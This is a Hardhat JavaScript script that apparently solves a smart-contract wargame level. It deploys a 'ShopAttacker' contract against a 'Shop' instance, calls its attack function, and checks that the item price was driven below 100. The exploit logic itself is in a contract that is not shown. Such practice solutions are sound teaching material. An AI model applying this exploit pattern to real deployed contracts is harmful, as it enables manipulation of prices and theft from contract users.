const { expect } = require("chai")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let price, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x786fB6D7709d306684fFfb95e9b9e28A4a518CEd"
    let target = await ethers.getContractAt("Shop", instanceAddress)
    let attackerContractFactory = await ethers.getContractFactory(
        "ShopAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    // Attack
    tx = await attackerContract.attack({ gasLimit: 3000000 })
    await tx.wait(1)

    // Check
    price = await target.price()
    if (parseInt(price) < 100) {
        console.log(
            `${symbols.success} Lowered the price to ${price.toString()}!`
        )
    } else {
        console.log(`${symbols.error} Price still set to ${price.toString()}`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
